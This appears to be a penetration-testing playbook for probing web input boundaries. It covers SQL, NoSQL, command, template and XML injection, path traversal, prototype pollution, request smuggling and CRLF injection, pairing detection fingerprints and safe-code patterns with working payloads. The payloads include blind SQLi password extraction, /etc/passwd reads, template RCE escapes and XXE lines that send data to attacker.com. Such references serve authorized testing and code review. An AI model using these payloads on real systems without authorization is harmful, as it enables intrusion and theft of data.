# Input Validation

Probe every input boundary for injection, traversal, type confusion, and
protocol-level attacks. Read this file before probing any route that accepts
user-controlled input.

---

## SQL Injection

### Detection Tree

For each input point, determine injection class by observing responses:

```
Send tautology: ' OR '1'='1
├── 200 + unexpected data → Error-based SQLi confirmed
├── 200 + same data      → try:
│   Send: ' AND '1'='1  (same as baseline)
│   Send: ' AND '1'='2  (different response)
│   ├── '1'='2 differs from '1'='1  → Boolean-blind SQLi
│   └── no difference → try time-based
└── 500 / error page → try variants:
    ├── " ) OR 1=1 --     (parentheses bypass)
    ├── " ) OR 1=1 #      (MySQL comment)
    └── " UNION SELECT 1,2,3 --  (column count probe)
```

### Per-DB Signal Table

| DB | Error pattern | Time-based | Comment |
|----|---------------|------------|---------|
| MySQL | `You have an error in your SQL syntax` | `SLEEP(5)` | `-- `, `#` comments |
| PostgreSQL | `ERROR: column "x" does not exist` | `pg_sleep(5)` | `--` comment only |
| MSSQL | `Unclosed quotation mark` | `WAITFOR DELAY '0:0:5'` | `--` comment; `;` statement separator |
| Oracle | `ORA-00933: SQL command not properly ended` | `DBMS_LOCK.SLEEP(5)` | Needs `FROM DUAL`; `--` comment |
| SQLite | `near "x": syntax error` | `randomblob(100000000)` | No user functions; slow via heavy queries |

### Blind SQLi Decision Tree

```
Send: ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)='1
├── Returns normal   → blind confirmed, proceed to exfil
│   Extract char by char:
│   ' AND (SELECT ASCII(SUBSTR(password,1,1)) FROM users LIMIT 1) > 64
└── Returns error    → check:
    └── Different injection point or not injectable
```

### ORM Injection

| ORM | Vulnerable pattern | Safe pattern |
|-----|-------------------|--------------|
| Prisma | `$queryRaw('SELECT * FROM User WHERE id = ' + input)` | `$queryRaw('SELECT * FROM User WHERE id = $1', input)` |
| Knex | `knex.raw(\`SELECT * FROM users WHERE id = '${input}'\`)` | `knex.raw('SELECT * FROM users WHERE id = ?', [input])` |
| TypeORM | `findOne({ where: { id: raw(input) } })` | `findOne({ where: { id: input } })` |
| Hibernate (Java) | `session.createQuery("FROM User WHERE name = '" + name + "'")` | `session.createQuery("FROM User WHERE name = :name").setParameter("name", name)` |

### Source Fingerprints to Detect

```yaml
detect_sqli:
  - signal: "string concatenation in SQL query"
    pattern: "'SELECT * FROM ' + input", "`SELECT ${input}`", "format(sql, input)"
    severity: High
  - signal: "raw query execution"
    pattern: "queryRaw(", "raw(", "createQuery(", "executeQuery("
    severity: Medium (safe if parameterized)
  - signal: "no prepared statement"
    pattern: "Statement.executeQuery("
    severity: High
```

---

## NoSQL Injection

### MongoDB

| Operator | Payload | Effect |
|----------|---------|--------|
| `$gt` | `{"$gt": ""}` | Match any non-empty string |
| `$ne` | `{"$ne": ""}` | Match anything not equal to empty |
| `$where` | `{"$where": "1"}` | JavaScript eval (RCE if unsanitized) |
| `$regex` | `{"$regex": ".*"}` | Match all |
| `$in` | `{"$in": ["admin", "root"]}` | Enumeration |
| `$nin` | `{"$nin": ["user"]}` | Exclusion |
| object spread | `{"role": {"$gte": ""}}` | Type confusion with operators |

### MongoDB Injection via JSON body

```json
{"email": {"$gt": ""}, "password": {"$gt": ""}}
// Bypass auth if query is: db.users.findOne({email, password})
```

### Source Fingerprints

```yaml
detect_nosqli:
  - signal: "operator not stripped from input"
    pattern: "req.body.$where", "$regex in req.body", "query operators passed through"
    severity: High
  - signal: "no schema validation before query"
    pattern: "Model.findOne(req.body)", "collection.find(body)"
    severity: High
  - signal: "user input spread into query object"
    pattern: "{...req.body}", "Object.assign(query, body)"
    severity: High
```

---

## Command Injection

### Per-OS Payloads

| OS | Separator | Payload | Context |
|----|-----------|---------|---------|
| Linux | `;` | `; ls -la` | Any shell |
| Linux | `|` | `\| cat /etc/passwd` | Piped to next command |
| Linux | `` ` `` | `` `whoami` `` | Command substitution |
| Linux | `$()` | `$(whoami)` | POSIX substitution |
| Windows | `&` | `& dir` | Sequential execution |
| Windows | `|` | `\| type C:\Windows\win.ini` | Pipe |
| Windows | `&&` | `&& dir` | Conditional (prev succeeds) |
| Windows | `` ` `` | `` `whoami` `` | PowerShell only |

### Source-Code Context Detection

| Framework | Vulnerable pattern | Safe pattern |
|-----------|-------------------|--------------|
| Node.js | `exec('ls ' + input)` | `execFile('ls', [input])` |
| Python | `os.system('ping ' + input)` | `subprocess.run(['ping', input])` |
| PHP | `shell_exec("ping $input")` | `escapeshellarg()` + `shell_exec` |
| Ruby | `system("ping #{input}")` | `system('ping', input)` |
| Java | `Runtime.getRuntime().exec("ping " + input)` | `ProcessBuilder("ping", input)` |

### Fingerprints

```yaml
detect_command_injection:
  - signal: "shell execution with concatenation"
    pattern: "exec(" + input, "system(" + input, "shell_exec(concat("
    severity: High
  - signal: "no input sanitization before shell command"
    pattern: "input passed to exec/system without escapeshellarg/shellescape"
    severity: High
```

---

## Path Traversal

### Payloads

```
../../../etc/passwd
....//....//etc/passwd            (recursive strip bypass)
..%252f..%252fetc%252fpasswd     (double URL encoding)
..%c0%ae%c0%ae/                  (overlong UTF-8 encoding)
..%u2216etc%u2216passwd          (Unicode encoding)
/var/www/../../../etc/shadow      (absolute path join abuse)
..;/..;/etc/passwd                (Java URI path normalization)
file:///etc/passwd                (URL scheme injection)
```

### Zip Slip (Archive Extraction)

| Language | Vulnerable pattern |
|----------|-------------------|
| Java | `new ZipEntry(entry.getName())` without validating `../` |
| Node.js | `unzip.extract(entry.path)` without path resolve |
| Python | `ZipFile.extractall()` without checking member name |
| Go | `tar.Header.Name` without `filepath.Clean` + prefix check |

### Source Fingerprints

```yaml
detect_path_traversal:
  - signal: "user input in file path"
    pattern: "readFile(input)", "fs.readFileSync(path.join(dir, input))"
    severity: High
  - signal: "no path.resolve + startsWith check"
    pattern: "path.join(root, input)" without root prefix validation
    severity: High
  - signal: "archive extraction without path validation"
    pattern: "ZipEntry.getName()", "entry.path", "member.name"
    severity: High
```

---

## XXE (XML External Entity)

### Attack Classes

| Class | Payload | Effect |
|-------|---------|--------|
| Inline | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Read file in entity value |
| Parameter | `<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;` | Read file in DTD |
| OOB | `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;` | Exfiltrate via HTTP |
| Billion Laughs | `<!ENTITY a "aaaa...">` repeated expansion | DoS via memory exhaustion |
| Blind | `<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://attacker.com/?data=%file;'>"> %eval; %exfil;` | Blind exfiltration via DTD hosting |

### Detection Signals

```yaml
detect_xxe:
  - signal: "XML parser with external entities enabled"
    pattern: "DocumentBuilderFactory.newInstance()", "SAXParser", "XmlReaderSettings"
    note: "Default is insecure in many parsers"
  - signal: "user input passed to XML parser"
    pattern: "parse(input)", "loadXML(input)", "parseXml(input)"
    severity: High
  - signal: "XXE protection absent"
    pattern: "no setFeature('http://apache.org/xml/features/disallow-doctype-decl', true)"
    severity: High
```

---

## GraphQL Injection

### Introspection Leak

```graphql
query { __schema { types { name fields { name } } } }
```
If this returns the schema, introspection is not restricted in production.

### Aliasing DoS

```graphql
query {
  a0: __typename
  a1: __typename
  # ... up to thousands
}
```

### Batching / Bruteforce

```graphql
query {
  u0: user(id: 1) { email }
  u1: user(id: 2) { email }
  # ... enumerate user IDs in single batch
}
```

### Source Fingerprints

| Pattern | Risk |
|---------|------|
| `graphql({ schema, rootValue })` without query depth limiting | DoS |
| `graphqlHTTP({ schema })` without `validationRules: [depthLimit()]` | DoS |
| No rate limiting on single endpoint | Batching abuse |
| `introspection: true` in production | Info disclosure |

---

## SSTI (Server-Side Template Injection)

### Per-Engine Detection & Escape

| Engine | Test Payload | RCE Escape |
|--------|-------------|------------|
| Jinja2 (Python) | `{{7*7}}` → `49` | `{{ ''.__class__.__mro__[1].__subclasses__()[X]('cat /etc/passwd', shell=True) }}` |
| Twig (PHP) | `{{7*7}}` | `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter('id') }}` |
| Freemarker (Java) | `${7*7}` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity (Java) | `#set($x=7*7)$x` | `#set($e="exp")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")` |
| Smarty (PHP) | `{$7*7}` | `{system('id')}` |
| Mako (Python) | `${7*7}` | `<% import os; x=os.popen('id').read() %>${x}` |

### Source Fingerprints

```yaml
detect_ssti:
  - signal: "user input in template render"
    pattern: "Template(input).render()", "env.from_string(input)", "template.compile(input)"
    severity: Critical
  - signal: "template string concatenation"
    pattern: "'Hello ' + name + '!' | render", "f'Hello {name}' | Template"
    severity: High
  - signal: "render with user-controlled context"
    pattern: "render(request.args)", "render({**user_data})"
    severity: High
```

---

## Prototype Pollution (JS)

### Attack Vectors

| Vector | Payload | Context |
|--------|---------|---------|
| JSON body | `{"__proto__": {"isAdmin": true}}` | POST/PATCH body |
| Constructor | `{"constructor": {"prototype": {"isAdmin": true}}}` | Bypass `__proto__` filtering |
| Nested merge | `{"a": {"__proto__": {"polluted": true}}}` | Deep merge libraries (lodash.merge) |
| Query params | `?__proto__[isAdmin]=true` | Express/qs query parser |
| URL path | `/api/__proto__/isAdmin` | Path-based assignment |

### Source Fingerprints

```yaml
detect_prototype_pollution:
  - signal: "unsafe object merge"
    pattern: "Object.assign({}, userInput)", "_.merge({}, body)", "_.defaultsDeep(body)"
    severity: High
  - signal: "query parser with prototype support"
    pattern: "app.use(qs({ allowPrototypes: true }))"
    severity: High
  - signal: "recursive merge in hot path"
    pattern: "merge(userConfig, defaults)"
    severity: Medium
```

---

## Type Confusion

### Payload Set

| Expected type | Send | Expected behavior |
|---------------|------|-------------------|
| number | `null`, `undefined` | Coerces to 0, may bypass > 0 checks |
| number | `NaN`, `Infinity` | Arithmetic may produce unexpected results |
| number | `-0` | `Object.is(-0, 0)` is false |
| number | `9999999999999999` | Precision loss (JS: 2^53 boundary) |
| number | `BigInt("9007199254740993")` | Not JSON-serializable, may throw |
| string | `[]`, `{}` | Coerces to empty string or `[object Object]` |
| string | `["admin"]` | Array where string expected, may match role check |
| boolean | `"true"`, `1`, `"false"` | Truthy/falsy mismatches |
| array | `{"0": "x"}` | Array-like object, may bypass length checks |
| object | `[]` | Array where object expected, may bypass property checks |

### Source Fingerprints

```yaml
detect_type_confusion:
  - signal: "loose comparison with user input"
    pattern: "== null", "== true", "if (input)"
    severity: Medium
  - signal: "parseInt/parseFloat on user input"
    pattern: "parseInt(req.body.amount)", "Number(req.body.qty)"
    severity: Medium (safe if followed by range check)
  - signal: "no type guard before processing"
    pattern: "typeof x === 'string'" not present before string ops
    severity: Low (depends on downstream)
```

---

## HTTP Request Smuggling

### Attack Classes

| Class | Payload | Effect |
|-------|---------|--------|
| CL.TE | `POST / HTTP/1.1\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG` | Frontend uses CL, backend uses TE |
| TE.CL | `POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\n...` | Frontend uses TE, backend uses CL |
| TE.TE | `Transfer-Encoding: xchunked` (obfuscated header) | Mismatched TE parsing |
| H2 downgrade | HTTP/2 downgrade to HTTP/1.1 with desync | HTTP/2 to HTTP/1.1 boundary confusion |

### Detection Signals

```yaml
detect_smuggling:
  - signal: "frontend proxy before backend app"
    pattern: "nginx → uwsgi/passenger", "cloudflare → origin", "ELB → app"
    severity: Medium (requires testing)
  - signal: "Transfer-Encoding header accepted"
    pattern: "no TE header stripping in proxy config"
    severity: High
```

---

## CRLF / Header Injection

### Payloads

```
%0d%0aX-Custom:%20injected
%0aX-Custom:%20injected           (LF-only, some parsers accept)
%E5%98%8D%E5%98%8A               (UTF-8 encoding of CRLF)
%E5%98%8A                         (UTF-8 encoding of LF)
```

### Source Fingerprints

```yaml
detect_crlf_injection:
  - signal: "user input in response header value"
    pattern: "res.setHeader('Location', input)", "res.redirect(input)"
    severity: High
  - signal: "no CRLF stripping in header value"
    pattern: "input.replace(/[\\r\\n]/g, '')" absent
    severity: High
```

---

## Source-Code Detection Quick Reference

| Vuln class | Primarily look for in | Key signal |
|-------------|----------------------|------------|
| SQLi | Repository/DAO/query builder | String concat in SQL query, raw query methods |
| NoSQLi | MongoDB query construction | Operator passthrough, spread of body into query |
| Command injection | Shell wrappers, file processors | exec/system/shell_exec with user input |
| Path traversal | File read/write, archive extraction | User input in file path, no prefix validation |
| XXE | XML parsers, document processors | User input fed to XML parser, entities enabled |
| SSTI | Template renderers, email builders | User input in template string or render context |
| Prototype pollution | Deep merge, object assign, query parsers | Unsafe merge, `__proto__` in body/query |
| Type confusion | Route handlers, validation chains | Loose comparison, parseInt without range check |
| Smuggling | Proxy config, ingress setup | CL + TE header coexistence, downgrade paths |
| CRLF injection | Redirect handlers, header setters | User input in response header value |

---

## Strategy

1. Identify all input points from surface mapping (body params, query strings, path parameters, headers, cookies, file uploads)
2. For each input boundary, determine expected type by reading handler code or schema validation
3. Submit type-confused variants from the type confusion payload set
4. Submit injection payloads matching the backend tech stack
5. Submit empty/null/omitted/malformed variants for every field
6. Submit encoding variants (double URL, UTF-8 overlong, Unicode bypass)
7. Observe responses for error disclosures, timing differences, status code variations
8. For blind injection, use OOB callbacks (interactsh) or timing-based detection

## Response Signal Table

| Signal | Likely Vuln |
|--------|-------------|
| Stack trace in response | Error info disclosure |
| SQL error with table/column names | SQL injection |
| Different response time ± operator | Blind injection (time-based) |
| 500 vs 400 on crafted input | Input validation gap |
| File content rendered in response | Path traversal |
| 200 vs 403 on same endpoint | Auth bypass via input manipulation |
| `<script>` or template syntax evaluated | XSS or SSTI |
| XML entity expansion causes delay/error | XXE |
| Different response on `'1'='1` vs `'1'='2` | Boolean-blind SQLi |
| HTTP response splitting (two responses) | CRLF injection |
